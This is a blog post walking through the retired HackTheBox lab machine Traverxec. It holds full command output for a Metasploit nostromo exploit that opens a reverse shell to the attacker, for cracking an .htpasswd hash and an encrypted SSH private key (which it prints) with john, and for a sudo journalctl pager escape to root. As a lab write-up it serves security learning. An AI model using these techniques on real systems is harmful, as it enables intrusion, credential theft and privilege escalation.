<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>HTB: Traverxec | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2020/04/htb-traverxec.html" title="Read more" class="entry-title-link">
                HTB: Traverxec</a>
        </h1>

        <div class="entry-date">
            <time datetime="2020-04-11T19:00:00+02:00">11 Apr 2020</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
          <a href="../../tag/nostromo.html" title="Read more with the label nostromo" class="meta-link">nostromo</a> 
          <a href="../../tag/journalctl.html" title="Read more with the label journalctl" class="meta-link">journalctl</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 9 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2020.04/traverxec_card.png" alt="Traverxec Card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.eu/home/machines/profile/217">Traverxec</a>.
This box is rated as an easy box. It implies the exploitation of a CVE on
notsromo, the use of some nostromo misconfiguration and a little trick to
trigger a page with a <code>sudo</code> command.</p>


<h1 id="user-part">User part</h1>
<h2 id="recon">Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan the ports 22 (SSH) and 80 (HTTP) are open.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Wed Nov 27 08:58:11 2019 as: nmap -p- -sS -oA nmap 10.10.10.165</span>
<span class="code-line">Nmap scan report for 10.10.10.165</span>
<span class="code-line">Host is up (0.088s latency).</span>
<span class="code-line">Not shown: 65533 filtered ports</span>
<span class="code-line">PORT   STATE SERVICE</span>
<span class="code-line">22/tcp open  ssh</span>
<span class="code-line">80/tcp open  http</span>
<span class="code-line"></span>
<span class="code-line"># Nmap done at Wed Nov 27 09:01:46 2019 -- 1 IP address (1 host up) scanned in 215.57 seconds</span>
<span class="code-line"></code></pre></div>

<p>Nothing particular about this services.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Wed Nov 27 09:04:36 2019 as: nmap -p22,80 -sSV -oA nmap 10.10.10.165</span>
<span class="code-line">Nmap scan report for 10.10.10.165</span>
<span class="code-line">Host is up (0.097s latency).</span>
<span class="code-line"></span>
<span class="code-line">PORT   STATE SERVICE VERSION</span>
<span class="code-line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span>
<span class="code-line">80/tcp open  http    nostromo 1.9.6</span>
<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
<span class="code-line"></span>
<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="code-line"># Nmap done at Wed Nov 27 09:04:44 2019 -- 1 IP address (1 host up) scanned in 7.91 seconds</span>
<span class="code-line"></code></pre></div>

<p>There is an exploit for nostromo in version 1.9.3 and a metasploit exploit
without a precision about the version.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># searchsploit nostromo</span>
<span class="code-line">--------------------------------------- ----------------------------------------</span>
<span class="code-line">Exploit Title                         |  Path</span>
<span class="code-line">                                      | (/usr/share/exploitdb/)</span>
<span class="code-line">--------------------------------------- ----------------------------------------</span>
<span class="code-line">Nostromo - Directory Traversal Remote  | exploits/multiple/remote/47573.rb</span>
<span class="code-line">nostromo nhttpd 1.9.3 - Directory Trav | exploits/linux/remote/35466.sh</span>
<span class="code-line">--------------------------------------- ----------------------------------------</span>
<span class="code-line"></code></pre></div>

<h2 id="web">Web</h2>
<p>We run a dirb against the web service.</p>
<p>The website is a portfolio for a web and apps developer.</p>
<p><img alt="homepage" src="/media/2020.04/traverxec_1.png"></p>
<p>The directory are listable.</p>
<p><img alt="Directory listing" src="/media/2020.04/traverxec_2.png"></p>
<p>Nothing interesting on the web part. Let us run the exploit found in the recon.</p>
<h2 id="msf">MSF</h2>
<p>We load the exploit in metasploit, set the option to target the box and set our
IP work the reverse shell and run it.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 exploit(multi/http/nostromo_code_exec) &gt; use exploit/multi/http/nostromo_code_exec</span>
<span class="code-line">msf5 exploit(multi/http/nostromo_code_exec) &gt; show options</span>
<span class="code-line"></span>
<span class="code-line">Module options (exploit/multi/http/nostromo_code_exec):</span>
<span class="code-line"></span>
<span class="code-line">   Name     Current Setting  Required  Description</span>
<span class="code-line">   ----     ---------------  --------  -----------</span>
<span class="code-line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span>
<span class="code-line">   RHOSTS   10.10.10.165     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span>
<span class="code-line">   RPORT    80               yes       The target port (TCP)</span>
<span class="code-line">   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span>
<span class="code-line">   SRVPORT  8080             yes       The local port to listen on.</span>
<span class="code-line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span>
<span class="code-line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span>
<span class="code-line">   URIPATH                   no        The URI to use for this exploit (default is random)</span>
<span class="code-line">   VHOST                     no        HTTP server virtual host</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">Payload options (cmd/unix/reverse_perl):</span>
<span class="code-line"></span>
<span class="code-line">   Name   Current Setting  Required  Description</span>
<span class="code-line">   ----   ---------------  --------  -----------</span>
<span class="code-line">   LHOST  10.10.15.7       yes       The listen address (an interface may be specified)</span>
<span class="code-line">   LPORT  4444             yes       The listen port</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">Exploit target:</span>
<span class="code-line"></span>
<span class="code-line">   Id  Name</span>
<span class="code-line">   --  ----</span>
<span class="code-line">   0   Automatic (Unix In-Memory)</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">msf5 exploit(multi/http/nostromo_code_exec) &gt; run</span>
<span class="code-line"></span>
<span class="code-line">[*] Started reverse TCP handler on 10.10.15.7:4444</span>
<span class="code-line">[*] Configuring Automatic (Unix In-Memory) target</span>
<span class="code-line">[*] Sending cmd/unix/reverse_perl command payload</span>
<span class="code-line">[*] Command shell session 2 opened (10.10.15.7:4444 -&gt; 10.10.10.165:56360) at 2019-11-27 09:50:39 +0100</span>
<span class="code-line"></span>
<span class="code-line">id</span>
<span class="code-line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
<span class="code-line"></code></pre></div>

<h2 id="nostromo">nostromo</h2>
<p>We got a shell as <code>www-data</code>. We start enumerating the box. There is a specific
folder for the <a href="http://www.nazgul.ch/dev_nostromo.html">nostromo web server</a>. In
<code>/var/nostromo/</code> we found some configuration files.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>ls /var/</span>
<span class="code-line">backups</span>
<span class="code-line">cache</span>
<span class="code-line">lib</span>
<span class="code-line">local</span>
<span class="code-line">lock</span>
<span class="code-line">log</span>
<span class="code-line">mail</span>
<span class="code-line">nostromo</span>
<span class="code-line">opt</span>
<span class="code-line">run</span>
<span class="code-line">spool</span>
<span class="code-line">tmp</span>
<span class="code-line">ls /var/nostromo/</span>
<span class="code-line">conf</span>
<span class="code-line">htdocs</span>
<span class="code-line">icons</span>
<span class="code-line">logs</span>
<span class="code-line">ls -al /var/nostromo/</span>
<span class="code-line">total 24</span>
<span class="code-line">drwxr-xr-x  6 root     root   4096 Oct 25 14:43 .</span>
<span class="code-line">drwxr-xr-x 12 root     root   4096 Oct 25 14:43 ..</span>
<span class="code-line">drwxr-xr-x  2 root     daemon 4096 Oct 27 16:12 conf</span>
<span class="code-line">drwxr-xr-x  6 root     daemon 4096 Oct 25 17:11 htdocs</span>
<span class="code-line">drwxr-xr-x  2 root     daemon 4096 Oct 25 14:43 icons</span>
<span class="code-line">drwxr-xr-x  2 www-data daemon 4096 Nov 27 03:39 logs</span>
<span class="code-line">ls -al /var/nostromo//conf/</span>
<span class="code-line">total 20</span>
<span class="code-line">drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 .</span>
<span class="code-line">drwxr-xr-x 6 root root   4096 Oct 25 14:43 ..</span>
<span class="code-line">-rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd</span>
<span class="code-line">-rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes</span>
<span class="code-line">-rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf</span>
<span class="code-line"></code></pre></div>

<p>We display the content of the <code>.htpasswd</code> file and found a hash.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>cat /var/nostromo//conf/.htpasswd</span>
<span class="code-line">david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/</span>
<span class="code-line"></code></pre></div>

<p>We load it into john an crack it with the rockyou dictionary. The password is
"Nowonly4me".</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>john hash -w=rockyou.txt</span>
<span class="code-line">Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])</span>
<span class="code-line">Will run 4 OpenMP threads</span>
<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
<span class="code-line">Nowonly4me       (david)</span>
<span class="code-line"></code></pre></div>

<p>Let us take a closer look at the <code>nhttpd.conf</code> file.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>cat /var/nostromo/conf/nhttpd.conf</span>
<span class="code-line"># MAIN [MANDATORY]</span>
<span class="code-line"></span>
<span class="code-line">servername      traverxec.htb</span>
<span class="code-line">serverlisten        *</span>
<span class="code-line">serveradmin     david@traverxec.htb</span>
<span class="code-line">serverroot      /var/nostromo</span>
<span class="code-line">servermimes     conf/mimes</span>
<span class="code-line">docroot         /var/nostromo/htdocs</span>
<span class="code-line">docindex        index.html</span>
<span class="code-line"></span>
<span class="code-line"># LOGS [OPTIONAL]</span>
<span class="code-line"></span>
<span class="code-line">lopid           logs/nhttpd.pid</span>
<span class="code-line"></span>
<span class="code-line"># SETUID [RECOMMENDED]</span>
<span class="code-line"></span>
<span class="code-line">user            www-data</span>
<span class="code-line"></span>
<span class="code-line"># BASIC AUTHENTICATION [OPTIONAL]</span>
<span class="code-line"></span>
<span class="code-line">htaccess        .htaccess</span>
<span class="code-line">htpasswd        /var/nostromo/conf/.htpasswd</span>
<span class="code-line"></span>
<span class="code-line"># ALIASES [OPTIONAL]</span>
<span class="code-line"></span>
<span class="code-line">/icons          /var/nostromo/icons</span>
<span class="code-line"></span>
<span class="code-line"># HOMEDIRS [OPTIONAL]</span>
<span class="code-line"></span>
<span class="code-line">homedirs        /home</span>
<span class="code-line">homedirs_public     public_www</span>
<span class="code-line"></code></pre></div>

<p>According to <a href="http://www.nazgul.ch/dev/nostromo_man.html">Nostromo manual</a> the
<code>HOMEDIRS</code> section allow the server to serve the user's home and some specific
folder. In fact this is possible as the <code>http://10.10.10.165/~david/</code> show us.</p>
<p><img alt="http://10.10.10.165/~david/" src="/media/2020.04/traverxec_5.png"></p>
<p>First of all we use python to get a proper shell <code>python -c 'import pty; pty.spawn("/bin/sh")'</code>.</p>
<p>The we go in the <code>public_www</code> folder inside david's home folder. We see that
there is a backup of some SSH identity files in a targz archive.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>$ cd /home/david/public_www/</span>
<span class="code-line">cd /home/david/public_www/</span>
<span class="code-line">$ ls</span>
<span class="code-line">ls</span>
<span class="code-line">index.html  protected-file-area</span>
<span class="code-line">$ ls protected-file-area</span>
<span class="code-line">cls protected-file-area</span>
<span class="code-line">backup-ssh-identity-files.tgz</span>
<span class="code-line"></code></pre></div>

<p>We copy the archive to <code>/tmp/</code>, extract it and cat the private RSA key.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>$ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/</span>
<span class="code-line">cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/</span>
<span class="code-line">$ cd /tmp/</span>
<span class="code-line">cd /tmp/</span>
<span class="code-line">$ tar xvf backup-ssh-identity-files.tgz</span>
<span class="code-line">tar xvf backup-ssh-identity-files.tgz</span>
<span class="code-line">home/david/.ssh/</span>
<span class="code-line">home/david/.ssh/authorized_keys</span>
<span class="code-line">home/david/.ssh/id_rsa</span>
<span class="code-line">home/david/.ssh/id_rsa.pub</span>
<span class="code-line">$ cat home/david/.ssh/id_rsa</span>
<span class="code-line">cat home/david/.ssh/id_rsa</span>
<span class="code-line">-----BEGIN RSA PRIVATE KEY-----</span>
<span class="code-line">Proc-Type: 4,ENCRYPTED</span>
<span class="code-line">DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F</span>
<span class="code-line"></span>
<span class="code-line">seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG</span>
<span class="code-line">tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W</span>
<span class="code-line">KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU</span>
<span class="code-line">RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7</span>
<span class="code-line">HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc</span>
<span class="code-line">Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec</span>
<span class="code-line">dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN</span>
<span class="code-line">6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO</span>
<span class="code-line">xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1</span>
<span class="code-line">Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6</span>
<span class="code-line">i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T</span>
<span class="code-line">fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA</span>
<span class="code-line">bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so</span>
<span class="code-line">uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I</span>
<span class="code-line">Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s</span>
<span class="code-line">9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U</span>
<span class="code-line">rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua</span>
<span class="code-line">4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU</span>
<span class="code-line">/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX</span>
<span class="code-line">JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+</span>
<span class="code-line">XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh</span>
<span class="code-line">hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf</span>
<span class="code-line">SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM</span>
<span class="code-line">j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt</span>
<span class="code-line">VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w</span>
<span class="code-line">-----END RSA PRIVATE KEY-----</span>
<span class="code-line"></code></pre></div>

<p>We then try to connect to the box using the key with david account but the SSH
key is password protected. We use ssh2john to get a crackable hash and run john
with the rockyou dictionary on it.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>python /usr/bin/ssh2john id_rsa &gt; id_rsa.hash</span>
<span class="code-line">john  id_rsa.hash -w=~/tools/password_lists/rockyou.txt</span>
<span class="code-line">Warning: detected hash type &quot;SSH&quot;, but the string is also recognized as &quot;ssh-opencl&quot;</span>
<span class="code-line">Use the &quot;--format=ssh-opencl&quot; option to force loading these as that type instead</span>
<span class="code-line">Using default input encoding: UTF-8</span>
<span class="code-line">Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span>
<span class="code-line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</span>
<span class="code-line">Cost 2 (iteration count) is 1 for all loaded hashes</span>
<span class="code-line">Will run 4 OpenMP threads</span>
<span class="code-line">Note: This format may emit false positives, so it will keep trying even after</span>
<span class="code-line">finding a possible candidate.</span>
<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
<span class="code-line">hunter           (id_rsa)</span>
<span class="code-line">Warning: Only 1 candidate left, minimum 4 needed for performance.</span>
<span class="code-line">1g 0:00:00:04 DONE (2019-11-27 15:12) 0.2061g/s 2957Kp/s 2957Kc/s 2957KC/s *7¡Vamos!</span>
<span class="code-line">Session completed</span>
<span class="code-line"></code></pre></div>

<p>We then connect to the box as david using the SSH key and its <code>hunter</code> password.
And we get the user flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># ssh david@10.10.10.165 -i id_rsa</span>
<span class="code-line">Enter passphrase for key &#39;id_rsa&#39;:</span>
<span class="code-line">Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
<span class="code-line">Last login: Wed Nov 27 05:55:05 2019 from 10.10.14.25</span>
<span class="code-line">david@traverxec:~$ cat user.txt</span>
<span class="code-line">7db0b&lt;redacted&gt;</span>
<span class="code-line"></code></pre></div>

<h1 id="root-part">Root part</h1>
<p>When trying the command <code>sudo -l</code> we are prompt for a password. Neither the
cracked passwords <code>hunter</code> nor <code>Nowonly4me</code> works.</p>
<p>In the david home folder we find a <code>bin</code> folder containing a bash program.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="ch">#!/bin/bash</span></span>
<span class="code-line"></span>
<span class="code-line">cat /home/david/bin/server-stats.head</span>
<span class="code-line"><span class="nb">echo</span> <span class="s2">&quot;Load: `/usr/bin/uptime`&quot;</span></span>
<span class="code-line"><span class="nb">echo</span> <span class="s2">&quot; &quot;</span></span>
<span class="code-line"><span class="nb">echo</span> <span class="s2">&quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;</span></span>
<span class="code-line"><span class="nb">echo</span> <span class="s2">&quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;</span></span>
<span class="code-line"><span class="nb">echo</span> <span class="s2">&quot; &quot;</span></span>
<span class="code-line"><span class="nb">echo</span> <span class="s2">&quot;Last 5 journal log lines:&quot;</span></span>
<span class="code-line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service <span class="p">|</span> /usr/bin/cat</span>
<span class="code-line"></code></pre></div>

<p>The interesting part is the last line. This mean that we have the <code>sudo</code>
permissions as <code>root</code> with no password (as it is in a script).
The <code>sudo</code> rights are well designed, we cannot change any argument in the line.
If we look at
<a href="https://gtfobins.github.io/gtfobins/journalctl/">gtfobins for journalctl</a> we
see that the interesting part is to get the pager (which by default is <code>less</code>,
which allow to run bash command with <code>!</code>).</p>
<p>As the command specifiecaly allow us to only have 5 lines from the <code>journalctl</code>
output what we need to do is to get a tiny tiny windows to trigger the pager.</p>
<p><img alt="Tiny window in order to trigger the pager" src="/media/2020.04/traverxec_3.png"></p>
<p>From <code>less</code> we are able to run a bash command as <code>/bin/bash/</code>.</p>
<p><img alt="Running a bash command from less" src="/media/2020.04/traverxec_4.png"></p>
<p>We then get a root shell and are able to get the flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span>
<span class="code-line">-- Logs begin at Wed 2019-11-27 05:44:37 EST, end at Wed 2019-11-27 06:15:38 EST</span>
<span class="code-line">Nov 27 06:11:16 traverxec crontab[4166]: (www-data) LIST (www-data)</span>
<span class="code-line">Nov 27 06:12:32 traverxec sudo[4554]: pam_unix(sudo:auth): authentication failur</span>
<span class="code-line">...skipping...</span>
<span class="code-line">Nov 27 06:12:41 traverxec sudo[4554]: www-data : user NOT in sudoers ; TTY=pts/1</span>
<span class="code-line">Nov 27 06:13:05 traverxec su[4567]: pam_unix(su:auth): authentication failure; l</span>
<span class="code-line">Nov 27 06:13:07 traverxec su[4567]: FAILED SU (to david) www-data on pts/6</span>
<span class="code-line">!/bin/bash</span>
<span class="code-line">root@traverxec:/home/david# cat /root/root.txt</span>
<span class="code-line">9aa36a6&lt;redacted&gt;</span>
<span class="code-line"></code></pre></div>

<h1 id="wrapping-up">Wrapping up</h1>
<p>This box is quit easy. The revershell is quit quick. The privilege escalation to
user might a pain as there is some rabbit holes (like this <code>Nowonly4me</code>
password) and the root part is quit CTFish but quick.</p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2020/04/htb-registry.html"> HTB: Registry </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2020/04/dawgctf-2020.html"> DawgCTF 2020 </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
                </li>
        </ul>
    </section>


<section class="module tagcloud">
    <h3 class="title module-title">Tags</h3>

    <ul>
            <li class="tag tag-4">
              <a href="../../tag/wordpress.html">wordpress</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/reverse.html">reverse</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/linux.html">linux</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/blog.html">blog</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/programming.html">programming</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adminer.html">adminer</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/metasploit.html">metasploit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/yaml.html">YAML</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/htb.html">HTB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/gdbserver.html">gdbserver</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/logrotate.html">logrotate</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/vault.html">vault</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/smb.html">SMB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ldap.html">LDAP</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/python.html">python</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/splunk.html">Splunk</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nano.html">nano</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openbsd.html">OpenBSD</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/gitlab.html">gitlab</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lfi.html">lfi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chef.html">chef</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/iot.html">IOT</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openemr.html">openEMR</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nosql.html">NoSQL</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/zip.html">zip</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/windows.html">windows</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/php-filter.html">php filter</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/winrm.html">winrm</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/print-nightmare.html">print nightmare</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/exploit.html">exploit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sqli.html">SQLi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nmap.html">nmap</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssti.html">SSTI</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vnc.html">VNC</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/laravel.html">laravel</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/memcache.html">memcache</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phishing.html">phishing</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxc.html">lxc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/upload.html">Upload</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pypi.html">pypi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/android.html">Android</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cewl.html">cewl</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/re.html">RE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cloudme.html">cloudme</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/tomcat.html">tomcat</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chisel.html">chisel</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/msfconsole.html">msfconsole</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sudo.html">sudo</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/capabilities.html">capabilities</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/screen.html">screen</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xxe.html">XXE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/webassembly.html">webassembly</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/challenge.html">challenge</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/docker.html">docker</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/devops.html">devops</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/ctf.html">CTF</a>
            </li>
